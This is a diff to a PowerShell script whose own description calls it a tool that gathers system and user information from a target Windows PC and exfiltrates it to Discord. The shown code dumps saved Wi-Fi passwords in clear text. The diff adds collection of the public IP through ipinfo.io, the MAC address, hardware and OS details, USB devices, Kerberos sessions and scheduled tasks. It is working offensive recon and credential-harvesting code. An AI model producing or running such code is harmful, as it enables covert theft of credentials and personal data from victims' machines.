@@ -25,7 +25,7 @@
 <#
 .DESCRIPTION
         This program gathers system and user information from target Windows PC. Gathered information is formated and output to a file. That file is then exfiltrated
-        to cloud storage via Discord. This program was influenced by various other programs and research.
+        to cloud storage via Discord. This program was influenced by I-Am-Jakoby's Adv-Recon, other programs, and research.
 #>
 
 ######################################################################################################################################################################
@@ -195,3 +195,54 @@ $NearbyWifi = NearbyWifi
 $WifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
 ######################################################################################################################################################################
+
+#Instance info
+
+#Pub IP add
+$PubAddr = Invoke-WebRequest ipinfo.io/ip -UseBasicParsing
+
+#Local IP interface(s) info
+$LocalAdd =  get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+
+#MAC add
+$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC
+
+#System info
+$SysInfo = Get-CimInstance CIM_ComputerSystem
+
+#BIOS info
+$BIOS = Get-CimInstance CIM_BIOSElement
+
+##OS Info (referenced I-Am-Jakoby)
+$OSInfo = Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
+
+#CPU Info
+Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
+
+#Mobo Info
+Get-WmiObject Win32_BaseBoard | Format-List
+
+#RAM Capacity
+function RamCap {
+    $IntCap = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % {($_.sum / 1GB)}
+
+    $RamCap = $IntCap
+
+    return "" + $RamCap + " GB"
+}
+
+$RamCap = RamCap
+
+######################################################################################################################################################################
+
+#Devices / Tasks
+
+#COM/ serical devices
+#Referenced I-Am-Jakoby
+$COMDev = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
+
+#Kerberos tickets = klist session?
+$klist = klist sessions
+
+#Lists scheduled tasks
+$ScheduledTasks = Get-ScheduledTask
